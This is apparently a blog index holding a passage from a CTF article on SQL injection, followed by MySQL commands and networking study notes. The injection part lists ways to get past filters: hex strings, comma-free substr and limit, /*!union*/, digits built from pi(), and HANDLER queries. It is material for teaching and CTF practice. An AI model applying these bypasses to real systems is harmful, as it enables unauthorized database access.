来合成字符串,或使用进制转换函数表示成其他进制例: SELECT * FROM users WHERE username = 0x44756d62 逗号被过滤 substr 与 limit 12substr(data FROM 1 for 1) # substr(data, 1, 1)limit 9 offset 4 # limit 9,4 使用 join 注入 1SELECT * FROM ((SELECT id FROM user)a join (SELECT name FROM user)b join (SELECT password FROM user)c)` 等价于 `SELECT id,name,password FROM user 等号或 like 被过滤 使用 正则表达式REGEXP 或 in != 和 &lt;&gt; 都是不等于 if 被过滤 case when condition then 1 else 0 end union被过滤 使用/*!union*/可以绕过对union的过滤 数字被过滤 代替字符 对应的数 对应的字符 false 0 无 !pi() 0 无 true 1 无 !!pi() 1 无 true+true 2 无 floor(pi()) 3 无 ceil(pi()) 4 无 floor(version()) 5 无 ceil(version()) 6 无 ceil(pi()+pi()) 7 无 floor(version()+pi()) 8 无 floor(pi()*pi()) 9 无 ceil(pi()*pi()) 10 A ceil(pi()*pi())+true 11 B ceil(pi()+pi()+version()) 12 C floor(pi()*pi()+pi()) 13 D ceil(pi()*pi()+pi()) 14 E ceil(pi()*pi()+version()) 15 F floor(pi()*version()) 16 G ceil(pi()*version()) 17 H ceil(pi()*version())+true 18 I floor((pi()+pi())*pi()) 19 J ceil((pi()+pi())*pi()) 20 K ceil(ceil(pi())*version()) 21 L ceil(pi()*ceil(pi()+pi())) 22 M ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi())*ceil(version()) 24 O floor(pi()*(version()+pi())) 25 P floor(version()*version()) 26 Q ceil(version()*version()) 27 R ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()*floor(pi())) 29 T HANDLER 语句代替SELECT查询语法如下: 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 附录 Mysql的基本操作 Sqlmap的使用 SQL fuzz 字典 Mysql的基本操作 修改表名12alter table test_a rename to sys_app;retable table test_a to sys_app; 修改表注释1alter table sys_application comment '系统信息表'; 修改字段类型和注释1alter table sys_application modify column app_name varchar(20) COMMENT '应用的名称'; 修改字段类型1alter table sys_application modify column app_name text; 设置字段允许为空1alter table sys_application modify column description varchar(255) null COMMENT '应用描述'; 增加一个字段，设好数据类型，且不为空，添加注释1alert table sys_application add `url` varchar(255) not null comment '应用访问地址'; 增加主键 1alter table t_app add aid int(5) not null ,add primary key (aid); 增加自增主键 1alter table t_app add aid int(5) not null auto_increment ,add primary key (aid); 修改为自增主键1alter table t_app modify column aid int(5) auto_increment ; 修改字段名字(要重新指定该字段的类型)1alter table t_app change name app_name varchar(20) not null; 删除字段 1alter table t_app drop aid; 在某个字段后增加字段1alter table `t_app` add column gateway_id int not null default 0 AFTER `aid`； #(在哪个字段后面添加) 调整字段顺序 1alter table t_app change gateway_id gateway_id int not null after aid ; #(注意gateway_id出现了2次) Sqlmap的使用sqlmap用法 SQL fuzz 字典sql_fuzz)dict 欢迎大家在评论区补充未提到的方法 参考 对MYSQL注入相关内容及部分Trick的归类小结","link":"/CTF-SQL-Inject/"},{"title":"计算机网络——物理层","text":"计算机网络——物理层 目录 相关术语 通信方式 数据传输方式 码元 奈氏准则和香农定理（重要） 奈氏准则 香农定理 编码和调制 编码 数字数据编码为数字信号（重要） 模拟数据编码为数字信号 调制 数字信号调制为模拟信号 模拟数据调制为模拟信号 数据交换 电路交换 报文交换 分组交换 数据报方式 虚电路方式 总结 传输介质 导向性传输介质 非导向性传输介质 物理层设备 转发器 放大器 网桥 中继器 集线器（多端口中继器） 物理层解决如何在连接各种计算机的传输媒体上传输数据比特流 主要任务确定与传输媒体接口有关的特性 机械特性定义物理连接的特性, 规定物理连接时所采用的规格,接口形状,引线数目,引脚数量和排列情况 电气特性规定传输二进制位时, 线路上信号的电压范围,阻抗匹配,传输速率和距离限制等 功能特性指明某条线上出现的某一电平表示何种意义,接口比肩的信号线的用途 规程特性定义各条物理线路的工作规程和时序关系 数据通信模型 1234567输入信息-&gt;[信源]-&gt;输入数据-&gt;[发送器]-&gt;发送的信号-&gt;[传输系统]-&gt;接收的信号-&gt;[接收器]-&gt;输出数据-&gt;[信宿]-&gt;输出信息 | | | | 源系统 | 传输系统 | 目的系统 | | 相关术语通信的目的时传送消息 消息语音,文字,图像等 数据 data传送信息的实体,是有意义的符号序列 信号数据的电器/电磁的表现, 是数据在传输过程中的存在形式数字信号(离散信号): 消息的参数的取值是离散的模拟信号(连续信号): 消息的参数的取值是连续的 信源产生和发送数据的源头 信宿接收数据的终点 信道信号的传输媒介 按传输信号分分为模型信道和数字信道 按传输介质分分为无线信道和有线信道 - 通信方式 通信方式 特点 需要信道数 单工通信 只有一个方向的通信而没有反方向的交互,只能往一个方向发送消息 1 条 半双工通信(双向交替通信) 通信双方都可以发送或接收信息,双方不能同时发送和接收 2 条 全双工通信(双向同时通信) 通信双方可以同时发送和接收消息 2 条 数据传输方式 传输方式 传输方法 特点 串行传输 将表示一个字符的 8 位二进制数据由低到高位的顺序依次发送 速度慢,费用低,适合远距离 并行传输 将表示一个字符的 8 位二进制数同时通过 8 条信道发送 速度快,费用高,使用近距离 并行传输用于计算机内部的数据传输 传输方式 传输方法 同步传输 以一个数据区块为单位,先送出 1 个或多个同步字符,在送出整批的数据, 需先送出一个或多个同步字符,在送出整批数据 异步传输 将比特分成小组传送,发送方考研在任何时刻发送比特组,接收方不知道何时到达,传输数据时,加一个字符起始位和终值位 码元码元是指用一个固定时长的信号波形, 代表不同离散数值的基本波形, 是数字通信中数字信号的计量单位其中时长内的信号称为 k 进制码元, 而时长称为码元宽度当码元的离散状态有 M 个时(M 大于 2), 称为 M 进制码元1 码元可以携带多个比特的信息量 K 进制码元-&gt;码元的离散状态有 K 个-&gt;K 中高低不同的信号波形 奈氏准则和香农定理(重要) 影响失真程度的因素: 1.码元传输速率;2.信号传输距离;3.噪声干扰;4 传输媒体质量码间串扰: 接收端收到的信号波形失去了码元之间清晰界限的现象 若题目中没明确要求使用哪种方法,且两者方法都能计算出极限传输率, 则取较小的为结果 奈氏准则 奈氏准则限制码元的传输速率一个相位可以有多种振幅, 故$码元的种数=相位数 \\times 振幅数$如题目中说 n 进制信号, 你即为码元的种数 在理想低通(无噪声, 带宽受限)条件下, 为了避免码间串扰, 极限码元传输速率为 2W Baud, W 是信道带宽(单位为 Hz) $$极限传输率=2Wlog_2V(b/s)$$其中 V 为码元的种数 通过奈氏准则,可知: 在任何信道中, 码元的传输速率是有上限的若超过此上限, 会出现码间串扰的问题 信道的频带越宽(能通过的信号越多), 可以使用更高的速率进行码元的有效传输 奈氏准则限制信息传输速率 要提高数据的传输率. 可以使每个码元携带更多比特信息 香农定理在带宽受限且有噪声的信道中, 为了不产生误差, 信息的数据传输速率有上限值 $$信噪比=\\frac{信号的平均功率}{噪声的平均功率}, 记为\\frac{S}{N}\\\\信噪比(分贝dB)=10log_{10}(S/N)$$ 注意上面的信噪比不带单位, 下面的信噪比带单位, 做题时要看清楚题目给的$\\frac{S}{N}$是否带单位 $$信道的极限数据传输速率=Wlog_2(1+\\frac{S}{N})(b/s)$$ W 为带宽 根据香农公式可知: 信道的带宽或信道中的信噪比越大, 则信息的极限传输速率就越高 对一定的传输带宽和一定的信噪比, 信息传输速率的上限就确定了 若信息的传输速率低于信道的极限传输速率, 则一定能找到方法实现无差错传输 实际信道的传输速率比香农定理计算饿极限信息传输速率低 若带宽 W 或信噪比($\\frac{S}{N}$)无上限, 则极限信息传输速率也没上限 编码和调制 基带信号将数字信号 1 和 0 直接用两种不同的电压表示, 在传输到数字信道上取传输(基带传输) 发出的是直接表达了要传输的信息的信号 宽带信号将基带信号进行调制后形成的频分复用模拟信号, 在传送到模拟信道上去传输(宽带传输, 频带传输) 距离较近时, 使用基带传输, 较远时, 使用宽带传输 编码是将数据变成数字信号或将模拟数据编码为数字信号调制是将数据变成模拟信号 编码 数字数据编码为数字信号(重要) 编码方式 编码方法 特点 非归零编码(NRZ) 高电平表示 1,低电平表示 0 1.容易实现; 2.没有检错能力; 3.无法判断一个码元的开始和结束,双方难以保持同步 曼彻斯特编码 将一个码元分成 2 个相等的间隔; 前一个间隔为低电平后一个电平为高电平表示码元 0; 码元 1 与之相反 每一个码元中间出现电平跳变, 可作为时钟信号(用于同步),又作为数据信号; 但是占用的频带宽度为原始基带宽度的两倍; 数据传输速率只有调制速率的一半 差分曼彻斯特编码 若码元为 1,则前半个码元的电平与上一个码元的后半个码元的电平相同.码元 0 则相反 (同 1 异 0) 每个码元中间又一次电平跳转,可以实现同步, 且抗干扰性强于曼彻斯特编码 归零编码(RZ) 信号电平在一个码元内要恢复到零 容易长时间不使用信道 反向不归零编码(NRZI) 信号电平翻转表示 0,信号电平不变表示 1 对于全 1 的数据难以识别 4B/5B 编码 比特率中插入额外的比特来打破一串的 0 或 1, 用 5 个比特来编码 4 个比特的数据, 只采用 16 种对于 16 种不同的 4 位码,其他 16 种作为控制码 编码效率为 80% 10BaseT 采用曼彻斯特编码以太网使用曼彻斯特编码, 波特率为数据率的两倍 模拟数据编码为数字信号 在计算机内部处理的都是数字音频 将模拟音频通过采样,量化转换成有限个数字表示的离散序列(音频数字化)典型的例子是脉码调制(PCM),一共分为三步:抽样,量化, 编码 抽样对模拟信号周期性扫描, 把时间上连续的信号变成时间上离散的信号$$f_{采样频率} \\geq 2f_{信号最高频率} $$ $数据传输率 = f_{采样频率} \\times 每个样值得编码位数$若有多路, 则其他路得数据率均要等于最大数据率(使用脉冲填充) 量化把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值, 并取整数, 这就把连续的电平幅值转化为离散的数字量 编码把量化的结果转换为对应的二进制编码 调制 数字信号调制为模拟信号发送端将数字信号转换为模拟信号, 接收端将模拟信号还原为数字信号, 分别对应调制解调器的调制和解调过程 调幅调整幅度, 无幅度为 0, 有幅度为 1 调频低频为 0, 高频为 1 调相0 和 1 对应的波形不同 调幅+调相(QAM)(正交振幅调制)两者结合使用相位个数 n,振幅种数 m, 则可以有$n\\times m $种码元 常与链路的信息传输速率结合起来考 模拟数据调制为模拟信号 数据交换 报文交换和分组交换为存储转发交换方式无连接服务: 不事先确定传输路径, 每个数据单元独立确定传输路径, 不同数据单元的传输路径可能不同连接服务: 确定一条传输路径, 之后的数据单元都延该路径传输 传输数据量大, 且传送时间远大于呼叫时, 选用电路交换(电路交换传输时延最小) 端到端的通路由很多段链路组成时, 采用分组交换 从信道利用率上, 报文交换和分组交换由于电路交换, 分组交换的交换时延小,适合计算机之间突发式的数据通信 电路交换 原理源结点与目的结点有一条由中间结点构成的专用的物理连接线路, 数据传输结束之前, 线路一直保持使用 阶段建立连接-&gt;通信-&gt;释放连接 特点独占资源, 用户始终占用端到端的固定传输带宽.适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况 优点 传输时延小 数据顺序传送, 无失序问题 实时性强, 双方建立物理通路后,可实时通信,适用于交互式会话类通信 全双工通信, 没有冲突, 通信双方有不同的信道, 不会争用物理信道 适用于模型信号和数字信号 控制简单, 电路的交换设备及控制较简单 缺点 建立连接时间长 线路独占, 即使线路空闲, 也不能提供给其他用户使用, 信道使用效率低 灵活性差, 连接通路种出现故障,必须重新拨号建立连接, 不适应突发性通信 无数据存储能力, 难以平滑通信量 数据直达, 不同类型,不同规格,不同速率的终端很难相互进行通信 无法发现与纠正差错, 难以在通信过程种进行差错控制 报文交换 报文时网络交换与传送的数据单元(站点一次性要发送的数据块) 原理无需在站点间建立一条专用的通路, 传送过程采用存储转发的方式 优点 无需建立连接, 无建立连接时延, 用户可随时发送报文 动态分配线路, 动态选择最佳路径, 可以平滑通信量 提高线路可靠性, 某条线路发生故障, 可选择其他线路 提高线路利用率, 可以不同时间分段的占有部分物理通道, 多个报文可共享信道 提供多目标服务, 一个报文可以发往多个目的地址 容易实现代码转换和速率匹配, 收发双方可以不同时处于可用状态, 便于类型,规格,速度不同的计算机之间通信 缺点 实时性差, 数据进入交换结点需要存储转发, 存在转发时延 只适用数字信号 报文长度无限制, 每个中间结点需完整的接收传来的整个报文, 输出线路不空闲时, 可能需要存储几个完整报文等待转发, 因此要求网络这每个结点需要有较大的缓冲区; 有时需要把等待转发的报文存在磁盘上, 进一步增加了传送时延 分组交换 相对于报文交换, 有如下优点 缓冲区易于管理 分组的平均长度固定不变 更易标准化 更适合应用 将数据分割成小块, 逐块发送分组 原理与报文交换工作方式基本相同, 但是分组交换限制所传输的数据单位的长度.发送结点将数据报文划分成一定长度的分组, 以分组为单位进行传输和交换.接收节点将收到的分组组装成信息或报文 优点 无需建立连接, 无需专用通路, 双方可随时发送分组 线路利用率高,可以不同时间分段的占有部分物理通道, 多个报文可共享信道 简化了存储管理, 分组长度固定, 相应的缓冲区大小也固定 加速传输, 后一个分组的存储与前一个分组的转发可用并行操作传输一个分组比一个报文所需的缓冲区小, 减少等待发送时间 减少出错几率和重发数据量, 提高可靠性, 减少传输时延 分组短小, 适用于计算机之间突发式数据通信 缺点 仍存在存储转发时延, 结点交换机必须有更强的处理能力 每个分组需加控制信息, 降低了通信效率, 增加了处理时间 分组交换采用数据报服务时, 可能出现失序,丢失或重复分组, 分组到达目的结点时, 要对分组按编号进行排序等工作采用虚电路服务,有呼叫建立,数据传输和虚电路释放三个过程 数据报方式 特点 为网络层提供无连接服务, 发送发可随时发送分组, 结点可用随时接收分组 同一报文的不同分组到达目的节点时可能发生乱序,重复, 丢失 每个分组在和窜书过程种需携带源地址和目的地址及分组号 分组在存储转发时, 需排队等候处理当通过交换结点的通信量较大或网络拥塞时, 这种时延回大大增加 网络会有冗余路径, 对于故障的适应能力强, 适用突发性通信, 不适于长报文, 会话式通信 虚电路方式 结合电路交换和数据报方式 源主机到目的主机类似于电路的路径(逻辑连接),路径上所有结点需要维持虚电路的建立(每个结点维持一张虚电路表), 每一项记录一个打开的虚电路的信息 特点 为网络层提供连接服务, 源节点与目的结点建立一条逻辑连接 分组通过虚电路顺序传输, 不需要携带源地址,目的地址等信息包含虚电路号, 相对数据报方式开销小同一报文的不同分组到达目的结点时不会乱序,重复或丢失 分组在每个结点只进行差错检测 每个结点可与多个结点建立虚电路, 每条虚电路支持特定的两个端系统之间的数据传输, 可以对两个数据端点的流量进行控制两个端系统之间也可有多条虚电路为不同的进程服务 网络中的结点出现故障失效时, 所有经过该结点的虚电路被破坏 总结 交换方式 特点 适用范围 电路交换 数据有序, 专用通路, 传输时延最小 数字信号和模拟信号 报文交换 报文长度无限制, 数据无序, 能控制差错 数字信号 数据报交换 数据无序, 分组长度有限, 能控制差错 虚电路交换 数据有序, 分组长度有限, 能控制差错 以太网采用的是分组交换 传输介质传输介质(传输媒体/传输媒介)是数据传输系统中发送设备和接收设备之间的物理通路传输介质不是物理层, 传输介质在物理层的下面 导向性传输介质电磁波被导向沿固体(铜线/光纤)媒介传播 双绞线 价格便宜, 在局域网中普遍使用 模拟传输和数字传输都可用使用双绞线 通信距离几公里到几十公里距离远使用模拟传输时,用放大器放大衰减信号距离远使用数字传输时,用中继器将失真信号整型 同轴电缆 根据传送信号不同, 分为基带同轴电缆(传送基带数字信号) 和宽带同轴电缆(基带信号调制成的模拟信号) 抗干扰特性比双绞线好 传输距离更远, 价格更贵 光纤 多模光纤的原理: 光的全反射性 传递光脉冲来进行通信 带宽远大于其他传输媒体的带宽 光纤由纤芯(实心的)和包层构成, 利用全反射原理 特点 损耗小, 中继距离长 抗雷电和电磁干扰性能好 无串音干扰, 保密性好, 不易被窃听或截取数据 体积小, 重量轻 单模光纤 多模光纤 定义 在横向模式直接传输光信号 多种传输光信号模式 光源 定向性好的激光二极管 发光二极管 特点 衰耗小,适合远距离 易失真,适合近距离 非导向性传输介质自由空间, 介质一般为空气,真空, 海水等 无线电波 微波 红外线,激光 方向 信号向所有方向传播 信号固定方向传播 信号固定方向传播 特点 穿透能力强, 可远距离传输,用于通信领域 通信频率高,频段范围宽,数据率高,可用于地面微波接力通信和卫星通信 传输的信号要分别转换为各自的信号格式 卫星通信的优缺点: 优点 通信容量大, 距离远, 覆盖广,广播通信和多址通信 缺点 传播时延长, 受气候影响大, 误码率高, 成本高 物理层设备 不同网段在物理层互联时, 数据传输率要相同, 数据链路层协议可以不同 转发器只具备放大信号的功能 放大器用于远距离的模拟信号传输, 同时也会放大噪声, 引起失真. 网桥连接两个网段扩展物理网络的范围 中继器 5-4-3 规则一个互联网络中至多有 5 个网段, 4 个中继器, 3 个网段作为主机段 对衰减信号进行再生和还原, 不是对衰减信号进行放大, 保持与元数据相同, 以增加信号传输的距离, 延长网络的长度(再生数字信号) 中继器的两端是网段, 适用于完全相同的两类网络互联, 且两个网段的速率要相同 只将电缆段上的数据发送到另一段电缆, 仅作用于信号的电气部分 两端可用连接相同或不同的媒体 两端使用相同的协议 集线器(多端口中继器) 可以扩大网络范围也可以用集线器连接其他集线器来扩展网络范围,使网络范围内的主机能互相通信; 但是会将所有冲突域合并, 及所覆盖的范围内同一时间只有一台主机能发送, 降低了通信效率 对信号进行再生放大转发, 对衰减的信号进行放大, 转发到其他所有处于工作状态的端口(除输入端口) 可以增加信号的传输距离, 延长网络的长度 不具备信号的定向传送能力, 是共享式设备 不能分割冲突域, 因此同一时间只能有一台主机发送信息 各个主机平分带宽","link":"/network-network3/"},{"title":"计算机网络——网络层","text":"计算机网络——网络层 目录 网络层概述 网络层的协议 功能 IP 协议 IP 数据报格式 组成格式 IP 首部格式 数据报分片 偏移量的计算 IPv 分类 IP 地址 A 类地址 B 类地址 C 类地址 D 类地址 E 类地址: 特殊 IP 地址 总结对比 网络地址转换 NAT 子网划分,子网掩码,CIDR 子网划分 子网掩码 路由器分组转发算法 无分类编址 CIDR 路由聚合 最长前缀匹配 ARP 协议 ARP 协议原理 ARP 使用情况 DHCP 协议 工作流程 ICMP 协议 ICMP 报文格式 ICMP 报文类型 ICMP 差错报告报文 ICMP 询问报文 ICMP 的应用 IPv IPv 数据报格式 对比 IPv IPv 地址形式 基本地址类型 IPv 与 Ipv 的兼容 网络层概述主要任务是把分组从源端传到目的端, 为分组交换网络上的不同主机提供通信服务网络层的传输单位是数据报 分组是数据报的一个片段 网络层的协议 ARP 协议 IP 协议 ICMP 协议 IGMP 协议 ARP 为 IP 服务IP 为 ICMP 和 IGMP 服务 功能 路由选择与分组转发选择最佳路径 异构网络互联不同网络(局域网,校园网等)的互联 拥塞控制若所有结点来不及接收分组, 而要丢弃大量分组, 网络就处于拥塞状态通过以下方法来解决这种问题 开环控制(静态的方法)静态的配置,在网络开始工作前, 预先控制所有能产生拥塞的因素 闭环控制(动态的方法)网络运行时, 动态的调整来进行拥塞控制 IP 协议 IP 数据报格式 组成格式 固定部分20字节 可变部分可有可无 IP 数据报过长时, 会分段 IP 首部格式 版本(4 位)IPv4 或 IPv6 首部长度(4 位)单位是 4B, 最小为 5 即首部 4 位全为 1, 表示首部长度为$15\\times 4B$当首部的长度不是 4B 的倍数时, 会进行填充 区分服务(8 位)指示希望获得哪种类型的服务 总长度(16 位)首部+数据部分的长度, 单位为 1B 标识(16 位)同一数据报的分片使用相同的标识 标志(3 位)只有 2 位有意义,最高位保留中间位 DF=1时, 禁止分片; 中间位 DF=0时, 允许分片最低为 MF=1时, 表示后面还有分片(该分组不是最后一个);最低为 MF=0时, 表示该分组是最后一个或没有分片 片偏移(13 位)指出较长分组分片后, 某片在原分组中的相对位置单位为 8B 除了最后一个分片, 每个分片的长度一定是 8B 的整数倍 生存时间 TTL(8 位)IP 分组的保质期(可以经过多少个路由器)每经过一个路由器, 该字段减 1, 该字段为 0 ,则丢弃 协议(8 位)数据部分使用的协议 1-&gt;ICMP|6-&gt;TCP|17-&gt;UDP2-&gt;IGMP|8-&gt;EGP|9-&gt;IGP|41-&gt;IPv6|50-&gt;ESP|89-&gt;OSPF 首部检验和(16 位)只检验首部 源地址(32 位)源 IP 地址 目的地址(32 位)目的 IP 地址 可选字段范围是 0~40B用来支持排错, 测量以及安全等措施 数据报分片是将数据部分进行分片 最大传输单元 MTU 链路层数据帧可封装数据的上限(数据链路层的数据帧中数据部分的最大长度) 以太网的 MTU 是 1500 字节 这里注意MTU 要包含首部 偏移量的计算 第一个分片的片偏移是0 之后的分片的$$片偏移=\\frac{前一个分片的长度+前一个分片的片偏移\\times 8}{8}$$ IPv4IP 地址: 全世界唯一的 32 位标识符, 标识路由器和主机的接口 分类 IP 地址 A 类地址0(网络号 0 开头) net-id(网络号)(8 位) host-id(主机号)(24 位) 地址范围0.0.0.0 ~ 127.255.255.255可用与分配的 IP 地址1.x.y.z ~ 126.x.y.z其中 x,y,z 的各个二进制位不能全为 0 或 1 私有地址范围10.0.0.0~10.255.255.255(1 个网段) B 类地址10(网络号 10 开头) net-id(网络号)(16 位) host-id(主机号)(16 位) 地址范围128.0.0.0 ~ 191.255.255.255可用与分配的 IP 地址128.0.y.z ~ 191.255.y.z其中 x,y,z 的各个二进制位不能全为 0 或 1 私有地址范围172.16.0.0~172.31.255.255(16 个网段) C 类地址110(网络号 110 开头) net-id(网络号)(24 位) host-id(主机号)(8 位) 地址范围192.0.0.0 ~ 223.255.255.255可用与分配的 IP 地址192.0.0.z ~ 126.255.255.z其中,z 的各个二进制位不能全为 0 或 1 私有地址范围192.168.0.0~192.168.255.255(256 个网段) D 类地址1110(网络号 1110 开头), 属于多播地址 直接广播地址A,B,C 类 IP 地址中主机号全为 1 的地址,用来使路由器将一个分组以广播的方式发送给特定网络上的所有主机 受限广播地址网络号与主机号全为 1 的地址用来将一个分组以广播方式发送给本网所有主机(路由器则阻挡该分组通过) 组播地址范围 224.0.0.0 ~ 239.255.255.255 范围内的每个 IP 地址(实际上代表一组特定的主机) 广播地址与组播地址 相同点:只能作为 IP 报文的目的地址，表示该报文的一组接收者，而不能把它分配给某台具体的主机。 区别:广播地址是按主机的物理位置来划分各组的(属于同一个子网)；组播地址指定一个逻辑组，参与该组的机器未必在同一个网内，可能遍布整个 Internet 网。 E 类地址:1111(网络号 1111 开头)保留为今后使用 特殊 IP 地址 网络号 主机号 作为源地址 作为目的地址 用途 全 0 全 0 可以 不可以 表示网络范围内的主机 , 路由表中用于表示默认路由(表示整个 Internet 网络) 全 0 特定值 可以 不可以 表示本网络范围内的特定主机 全 1 全 1 不可以 可以 本网广播地址(路由器不转发广播地址) 特定值 全 0 不可以 不可以 表示一个网段 特定值 全 1 不可以 可以 直接广播地址, 对特定网络所有主机进行广播 127 任何(非全 0/1) 可以 可以 本地回环地址 总结对比 网络类别 A B C 特征位 0 10 110 网络号长度 8bit 16bit 24bit 主机号长度 24bit 16bit 8bit 最大网络数 126 ($2^7 – 2$) 16,383 ($2^{14}-1$) 2,097,151 ($2^{21}-1$) 第一个可用的网络号 1 128.0 192.0.0 最后一个可用的网络号 126 191.255 223.255.255 每个网络的最大主机数 16777214($2^{24}-2$) 65534($2^{16}-2$) 254($2^8-2$) A 类中不可用的网络数有全 0 和全 1(回环地址) 网络地址转换 NAT网络地址转换 NAT 是指: 在专用网连接到因特网的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT 路由器，它至少有一个有效的外部全球 IP 地址 功能让内网用户能访问外网 NAT 转换表记录 WAN 端 IP 地址和端口对应的 LAN 端 IP 地址和端口内网主机发出去的数据转换成转换表中的 IP 和端口, 路由器接收到信息后, 根据 NAT 转换表将数据发送给对应的主机 WAN 端是外网, LAN 端是内网 转换过程 内部主机 X 用本地地址 IPX 和因特网上主机 Y 通信所发送的数据报必须经过 NAT 路由器 NAT 路由器将数据报的源地址 IPX 转换成全球地址 IPG,但目的地址 IPY 保持不变,然后发送到因特网 NAT 路由器收到主机 Y 发回的数据报时,知道数据报中的源地址是 IPY 而目的地址是 IPG 根据 NAT 转换表,NAT 路由器将目的地址 IPG 转换为 IPX,转发给最终的内部主机 X 子网划分,子网掩码,CIDR 子网划分 因分类的 IP 地址有如下缺点 IP 地址空间的利用率有时很低 两级 IP 地址不够灵活 划分子网后, 对外仍表现为一个网络即本单位外的网络不知道本单位内子网的划分 注意, 子网划分中主机号不能全 0 全 1, 子网号要分情况判断能否全 0 全 1 原理将主机号中划分出部分作为子网号 子网掩码网络号(包括子网号 )全 1, 主机号全 0 路由器分组转发算法 路由表中包含目的地址,该目的地址的子网掩码,及下一跳地址 提取目的 IP 地址 判断是否可以直接交付即 IP 地址是否在直连的网络上 特定主机路由 检测路由器路由表中有无路径将目的地址与子网掩码相与, 若与路由表中的目的地址相同, 则网下一跳地址发送无路径则到第 5 步 使用默认路由0.0.0.0 丢弃,报告转发分组出错 无分类编址 CIDR组成格式={网络前缀:主机号}即在 IP 地址后加上 “/“,后面跟上网络前缀所占的位数(对应三级编址中子网掩码中 1 的个数),如”220.78.162/24” 优点 消除传统 A,B,C 类地址以及划分子网的概念 融合子网地址与子网掩码, 分别子网划分 地址掩码与子网掩码相同 地址块网络前缀相同的称为CIDR 地址块 路由聚合 也叫构成超网 将多个 IP 地址聚合成一个地址块 好处可以更加有效的分配 IPv4 的地址空间,可根据客户的需要分配适当大小的 CIDR 地址快 方法多个 IP 地址从第一位比较起,一直到最后一个不同的截止,将相同的这部分作为网络前缀 最长前缀匹配使用 CIDR 时, 查找路由表可能得到几个匹配结果, 选择具有最长网络前缀的路由前缀越长, 地址块越小, 路由越具体 ARP 协议 因为在实际网络的链路上传送数据帧时, 必须使用 MAC 地址因此通过 ARP 协议来获得下一跳 MAC 地址 用于 IP 地址与 MAC 地址(硬件地址)的转换 ARP 高速缓存IP 地址与 MAC 地址的映射 ARP 协议原理 若有对应表则写入 MAC 帧 若没有则用目的 MAC 地址为全1的帧封装并广播 ARP 请求分组同一局域网中所有主机都能收到该请求目的主机收到请求后向源主机单播 ARP 响应分组源主机收到后将此映射写入 ARP 缓存 ARP 使用情况 情况 方法 主机 A 发给本网络的主机 B 用 ARP 找到主机 B 的 MAC 地址 主机 A 发给另一网络的主机 B 用 ARP 找到本网络上一个路由器(网关)的 MAC 地址 路由器发给本网络的主机 A 用 ARP 找到主机 A 的 MAC 地址 路由器发给另一网络的主机 B 用 ARP 找到本网络上一个路由器(网关)的 MAC 地址 源 IP 与目的 IP 在同一局域网内(在一个网段内) 广播 ARP 请求(其中目的 MAC 地址为全 1, 表示广播的分组) 单播响应(只有与目的 IP 地址相同的主机才会响应该请求, 回复源 IP 自身的 MAC 地址) 源 IP 与目的 IP 不在同一局域网内(不在同一网段) 发送端查询默认网关(与其他网段相连的路由器的内网接口)的 MAC 地址 广播 ARP 请求, 网关回复 MAC 地址 将要发送的分组的目的 MAC 地址设为默认网关的 MAC 地址, 目的 IP 不变 路由器收到后, 将数据转发出去 其中源 MAC 地址改成该路由器出口(与外界相连的接口)MAC 地址, 目的 MAC 修改为下一跳的 MAC 地址(若不知道,则路由器作为发送设备, 回到步骤 1, 直到将数据发送到目的 IP) DHCP 协议 DHCP 时应用层协议, 使用客户/服务器方式客户端和服务端通过广播方式进行交互(基于UDP) 提供即插即用联网机制主机重服务器动态获取 IP 地址,子网掩码,默认网关,DNS 服务器名称与 IP 地址允许地址重用, 支持移动用户加入网络,支持再用地址续租 工作流程 主机广播 DHCP 发现报文通过广播找到网络服务器 DHCP 服务器广播 DHCP 提供报文服务器拟分配给主机一个 IP 地址 同一时间可能会有多个服务器响应主机的发现报文, 主机先收到哪一个就使用哪一个服务器 主机广播 DHCP 请求报文向服务器确认使用拟定的 IP 地址 用广播也可以通知第 2 步中其他发来报文的主机收回拟定的 IP DHCP 服务器广播 DHCP 确认报文正式将 IP 地址分配给主机 ICMP 协议 ICMP 支持主机或路由器 作用差错或异常报告网络探询 ICMP 报文格式 ICMP 报文类型 ICMP 差错报告报文 终点不可达 (无法交付) 路由器或主机不能交付数据时, 向源点发送终点不可达 源点抑制 (拥塞丢失数据) 路由器或主机由于拥塞而丢弃数据报时, 向源点发送源点抑制报文, 使源点把数据报发送速率放慢 时间超时 路由器收到生存时间 TTL=0 的数据报时, 丢弃该数据报,并向源点发送时间超过报文 当终点在预先规定时间内不能收到一个数据报的全部数据报片时, 把已收到的数据报片丢弃, 并向源点发送时间超过报文 参数问题 路由器或主机收到的数据报的首部中字段不正确时, 丢弃该数据报,并向源点发送参数问题报文 改变路由(重定向) 路由器把改变路由报文发送给主机, 让主机知道更好的路由路径 以下情况不发送 ICMP 差错报文 对 ICMP 差错报告报文不在发送 ICMP 差错报告报文 对第一个分片数据报片的所有后续数据报片都不发送 ICMP 差错报告报文 对具有组播地址的数据报不发送 ICMP 差错报告报文 对具有特殊地址(如:0.0.0.0 127.0.0.0)的数据报不发送 ICMP 差错报告报文 ICMP 询问报文 回送请求和回答报文 主机或路由器向特定目的主机发出的询问, 收到此报文的主机必须给源主机或路由器发送 ICMP 回送回答报文(Ping) 测试目的站是否可达并了解其相关状态 时间戳请求和回答报文 请某个主机或路由器回答当前日期和时间 用来进行时钟同步和测量时间 掩码地址请求和回答报文 路由器询问和通告报文 ICMP 的应用 Ping测试两个主机之间的连通性 使用 ICMP 回送请求和回答报文 Traceroute跟踪一个分组从源点到终点的路径 使用了 ICMP 时间超过差错报告报文 IPv6 32 位 IPv4 地址空间已用完 目的 从根本上解决地址耗尽问题 改进首部格式 实现快速处理和转发数据报功能 支持 QoS IPv6 数据报格式 版本协议版本, 总是 6 优先级数据报的类别和优先级 流标签所有属于同一个流的数据报拥有相同的流标签 流是互联网上从特定源点到特定终点的一系列数据 有效载荷长度指明有效载荷部分+数据部分的长度 下一个首部标识下一个扩展首部或上层协议首部的位置 跳数限制生存时间 源地址 目的地址 对比 IPv4 前 